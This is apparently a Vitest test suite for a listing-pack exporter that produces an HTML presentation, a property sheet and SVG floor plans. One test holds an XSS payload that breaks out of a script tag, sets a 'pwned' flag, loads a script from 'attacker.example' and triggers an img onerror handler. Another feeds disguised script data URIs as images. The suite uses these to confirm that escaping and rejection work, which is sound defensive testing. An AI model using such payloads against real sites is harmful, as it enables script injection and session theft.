// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { strFromU8, unzipSync, zipSync } from 'fflate';
import { blueprintPlan } from '../src/blueprint';
import { createBlankPlan } from '../src/domain';
import { buildListingPackFiles, listingFloorPlanSvg } from '../src/listingExport';
import { createListing } from '../src/listingTypes';
import { snapWindow } from '../src/windows';

const pixel = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a5RkAAAAASUVORK5CYII=';
const originalPixel = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQIHWP4z8DwHwAFgAI/ScLbtAAAAABJRU5ErkJggg==';
function openPresentation(html:string,schedule:typeof window.setTimeout=window.setTimeout.bind(window)) {
  const parsed=new DOMParser().parseFromString(html,'text/html');
  // Permit only slide data and one inline player. External scripts never execute in this
  // harness, so validate their absence before executing any generated content.
  const scripts=[...parsed.querySelectorAll('script')];
  const data=scripts.filter(script=>script.id==='slides');
  expect(data).toHaveLength(1);
  expect(data[0].getAttributeNames().sort()).toEqual(['id','type']);
  expect(data[0].type).toBe('application/json');
  const players=scripts.filter(script=>script.id!=='slides');
  expect(players).toHaveLength(1);
  expect(players[0].getAttributeNames()).toEqual([]);
  expect(parsed.querySelector('script[src]')).toBeNull();
  const sandbox: {pwned?:number}={};
  // Execute only the generated inline scripts against an isolated parsed document.
  for(const script of parsed.querySelectorAll('script:not([type="application/json"])'))new Function('document','window','setTimeout','clearTimeout',script.textContent!)(parsed,sandbox,schedule,window.clearTimeout.bind(window));
  return {document:parsed,sandbox};
}
function fixture() {
  const base = createBlankPlan('Home', 'metric'), floorId = base.floors[0].id;
  const plan = blueprintPlan(base, floorId, { rooms: [{ id: 'living', name: 'Living & dining', kind: 'Living', enclosed: true, x: 0, z: 0, width: 4250, depth: 3100 }], walls: [], omittedWalls: [], fixtures: [] });
  const doc = createListing(plan.id, 'A lovely home');
  doc.details = { ...doc.details, address: '12 Test Lane', price: '$500,000', beds: '2', baths: '1', area: '900 sq ft', description: 'Bright home', highlights: 'Balcony\nStorage', agentName: 'SECRET AGENT', agentEmail: 'private-agent@example.test', agentPhone: '555-123-9900', agency: 'SECRET AGENCY' };
  doc.media = [{ id: 'view', title: 'Living area', caption: 'South-facing windows', kind: 'render', image: pixel, seconds: 4, floorId }];
  return { plan, doc, floorId };
}

describe('listing pack', () => {
  it('produces a real ZIP containing portable media, presentation, plan, text and provenance', () => {
    const { doc, plan } = fixture(), before = JSON.stringify({ doc, plan });
    // Node's TextEncoder has a separate typed-array realm in jsdom; real browsers do not.
    const bytes=Object.fromEntries(Object.entries(buildListingPackFiles(doc, plan)).map(([path,value])=>[path,new Uint8Array(value)]));
    const files = unzipSync(zipSync(bytes));
    expect(Object.keys(files)).toEqual(expect.arrayContaining(['index.html', 'property-sheet.html', 'listing.txt', 'provenance.json', 'seedance-storyboard.txt', 'README.txt']));
    const manifest = JSON.parse(strFromU8(files['provenance.json']));
    expect(manifest.media[0]).toMatchObject({ kind: 'render', label: '3D design render', seconds: 4 });
    expect(files[manifest.media[0].path][0]).toBe(137);
    expect(files[manifest.floors[0].path]).toBeDefined();
    expect(strFromU8(files['README.txt'])).toContain('Extract the entire ZIP');
    expect(JSON.stringify({ doc, plan })).toBe(before);
  });

  it('omits dedicated agent details from every file in an unbranded pack', () => {
    const { doc, plan } = fixture(); doc.branded = false;
    const files = buildListingPackFiles(doc, plan);
    for (const file of Object.values(files)) {
      const text = strFromU8(file);
      for (const value of [doc.details.agentName, doc.details.agency, doc.details.agentPhone, doc.details.agentEmail]) expect(text).not.toContain(value);
    }
    expect(JSON.parse(strFromU8(files['provenance.json'])).details).not.toHaveProperty('agentName');
    doc.branded = true;
    expect(strFromU8(buildListingPackFiles(doc, plan)['property-sheet.html'])).toContain(doc.details.agentName);
  });

  it('escapes malicious text in HTML, SVG and embedded JSON without changing its displayed value', () => {
    const { doc, plan } = fixture();
    const attack = '</script><script>window.pwned=1</script><script src="https://attacker.example/pwn.js"></script><img src=x onerror=alert(1)>';
    doc.details.title = attack; doc.details.description = attack; doc.media[0].title = attack; doc.media[0].caption = attack;
    plan.floors[0].name = attack;
    const files = buildListingPackFiles(doc, plan), html = strFromU8(files['index.html']);
    const dom = openPresentation(html);
    expect(dom.sandbox.pwned).toBeUndefined();
    expect(dom.document.querySelector('h1')?.textContent).toBe(attack);
    expect(dom.document.querySelector('[onerror]')).toBeNull();
    const data = JSON.parse(dom.document.querySelector('#slides')!.textContent!);
    expect(data[0].caption).toBe(attack);
    expect(html).toContain('\\u003c/script\\u003e');
    const svg = strFromU8(files[Object.keys(files).find(key => key.endsWith('.svg'))!]);
    expect(svg).not.toContain('<script>');
    expect(Object.keys(files).every(path => !path.includes('..') && !path.includes('<'))).toBe(true);
  });

  it('preserves paired originals and includes disclosure beside staged images', () => {
    const { doc, plan } = fixture(); doc.media[0] = { ...doc.media[0], kind: 'staged', originalImage: originalPixel };
    const files = buildListingPackFiles(doc, plan), manifest = JSON.parse(strFromU8(files['provenance.json']));
    const slide = manifest.media[0];
    expect(files[slide.originalPath]).not.toEqual(files[slide.path]);
    const dom = openPresentation(strFromU8(files['index.html']));
    const button = dom.document.querySelector<HTMLButtonElement>('#original')!;
    expect(button.hidden).toBe(false); button.click();
    expect(dom.document.querySelector('#label')!.textContent).toBe('Original photo');
    expect(dom.document.querySelector('img')!.getAttribute('src')).toBe(slide.originalPath);
    expect(strFromU8(files['property-sheet.html'])).toContain('Virtually staged');
    expect(strFromU8(files['property-sheet.html'])).toContain('Original photo');
  });

  it('exports raw uploads separately without presenting a staged upload as its own original comparison',()=>{
    const {doc,plan}=fixture();doc.media[0]={...doc.media[0],kind:'staged',sourceImage:originalPixel,originalImage:originalPixel};
    const files=buildListingPackFiles(doc,plan),manifest=JSON.parse(strFromU8(files['provenance.json'])),slide=manifest.media[0];
    expect(slide.sourcePath).toContain('-source.png');expect(files[slide.sourcePath]).toBeDefined();expect(slide.originalPath).toBeUndefined();
    const parsed=openPresentation(strFromU8(files['index.html']));expect(parsed.document.querySelector<HTMLButtonElement>('#original')!.hidden).toBe(true);
  });

  it('browses by button and arrow key, and honors each slide duration', () => {
    const { doc, plan } = fixture(); doc.format = 'portrait';
    doc.media.push({ ...doc.media[0], id: 'second', title: 'Bedroom', seconds: 7 });
    const scheduled: number[] = [];
    const dom = openPresentation(strFromU8(buildListingPackFiles(doc, plan)['index.html']), ((_handler: unknown, delay: number) => { scheduled.push(delay); return scheduled.length; }) as typeof window.setTimeout);
    const document = dom.document;
    (document.querySelector('#play') as HTMLButtonElement).click(); expect(scheduled.at(-1)).toBe(4000);
    (document.querySelector('#next') as HTMLButtonElement).click(); expect(document.querySelector('#title')!.textContent).toBe('Bedroom'); expect(scheduled.at(-1)).toBe(7000);
    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowLeft', bubbles: true }));
    expect(document.querySelector('#count')!.textContent).toBe('1 / 2');
    expect(document.querySelector('#stage')!.getAttribute('style')).toContain('9/16');
    (document.querySelector('#play') as HTMLButtonElement).click(); expect(document.querySelector('#play')!.getAttribute('aria-pressed')).toBe('false');
  });

  it('rejects remote and executable media, mismatched homes and excessive image counts', () => {
    const { doc, plan } = fixture();
    expect(() => buildListingPackFiles({ ...doc, planId: 'other' }, plan)).toThrow('matching home');
    for (const image of ['https://example.test/image.png', 'data:image/svg+xml;base64,PHN2Zz4=', 'data:text/html;base64,PHNjcmlwdD4=', 'data:image/png;base64,abcd!', 'data:image/png;base64,PHNjcmlwdD4=']) {
      expect(() => buildListingPackFiles({ ...doc, media: [{ ...doc.media[0], image }] }, plan)).toThrow('PNG, JPEG or WebP');
    }
    expect(() => buildListingPackFiles({ ...doc, media: Array(25).fill(doc.media[0]) }, plan)).toThrow('24 images');
  });
});

describe('exported floor geometry', () => {
  it('keeps exact measured dimensions, room labels and both modern and legacy openings', () => {
    const { plan, floorId } = fixture(), floor = plan.floors[0];
    const door = snapWindow(plan, { id: 'door', catalogId: 'door-flush', floorId, x: 1700, z: 0, rotation: 0, widthMm: 900, depthMm: 150, heightMm: 2000, variant: 'cream', elevationMm: 0 });
    plan.furniture.push(door);
    floor.openings.push({ id: 'old-window', kind: 'window', wallKey: '0:0:1:0', offset: .5, widthMm: 150 });
    const svg = listingFloorPlanSvg(plan, floor);
    expect(svg).toContain('4.25 m × 3.10 m'); expect(svg).toContain('13.2 m²');
    expect(svg).toContain('Living &amp; dining');
    expect(svg).toContain('data-opening="door"'); expect(svg).toContain('data-opening="window"');
    expect(svg).toContain('Planning estimate');
    expect(svg).toContain('Not an appraisal');
  });

  it('preserves a diagonal outline instead of filling its rectangular bounding box', () => {
    const base = createBlankPlan('Triangle', 'metric'), id = base.floors[0].id;
    const plan = blueprintPlan(base, id, { rooms: [{ id: 'tri', name: 'Triangle', kind: 'Bedroom', enclosed: true, x: 0, z: 0, width: 4000, depth: 3000, polygon: [{ x: 0, z: 0 }, { x: 4000, z: 0 }, { x: 0, z: 3000 }] }], walls: [], omittedWalls: [], fixtures: [] });
    const svg = listingFloorPlanSvg(plan, plan.floors[0]), parsed = new DOMParser().parseFromString(svg, 'image/svg+xml');
    expect(svg).toContain('6.0 m²');
    const wallLines = [...parsed.querySelectorAll('[data-layer="walls"] line')];
    expect(wallLines.some(line => line.getAttribute('x1') !== line.getAttribute('x2') && line.getAttribute('y1') !== line.getAttribute('y2'))).toBe(true);
  });

  it('shows a useful empty plan without invalid coordinates or stale room labels', () => {
    const { plan } = fixture(); plan.floors[0].walls.push({ id: 'new-wall', ax: 0, az: 0, bx: 2, bz: 2 });
    expect(listingFloorPlanSvg(plan, plan.floors[0])).not.toContain('Living &amp; dining');
    const empty = createBlankPlan(); const svg = listingFloorPlanSvg(empty, empty.floors[0]);
    expect(svg).toContain('No floor geometry drawn yet'); expect(svg).toContain('No measurements available'); expect(svg).not.toContain('5.00 m'); expect(svg).not.toMatch(/NaN|Infinity/);
  });
});
